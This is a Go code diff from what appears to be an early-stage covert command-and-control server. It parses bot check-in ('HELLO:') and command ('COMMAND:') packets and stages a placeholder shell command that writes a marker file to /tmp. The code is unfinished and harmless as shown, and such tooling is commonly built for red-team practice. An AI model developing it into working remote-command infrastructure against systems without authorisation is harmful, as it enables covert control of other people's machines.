@@ -21,6 +21,8 @@ import (
 	"github.com/google/gopacket/layers"
 )
 
+var stagedCmd = "echo 'gotem' > /tmp/cattails"
+
 // Function to do this err checking repeatedly
 func checkEr(err error) {
 	if err != nil {
@@ -84,19 +86,18 @@ func ProcessPacket(packet gopacket.Packet) {
 
 	payload := strings.Split(data, " ")
 
+	// Get the type of message
 	typeOfMessage := payload[0]
-	id, err := strconv.Atoi(payload[1])
-	checkEr(err)
-	hostname := payload[2]
-	mac := net.HardwareAddr(payload[3])
-	ip := net.IP(payload[4])
 
-	fmt.Println(typeOfMessage, id, hostname, mac, ip)
-
-	// Take staged command and craft packet to send to bot
-
-	fmt.Println()
-
+	if typeOfMessage == "HELLO:" {
+		id, err := strconv.Atoi(payload[1])
+		checkEr(err)
+		hostname := payload[2]
+		mac := payload[3]
+		ip := payload[4]
+	} else if typeOfMessage == "COMMAND:" {
+		cmdToExec := payload[1]
+	}
 }
 
 // CreateAddrStruct creates a "syscall.ScokaddrLinklayer" struct used
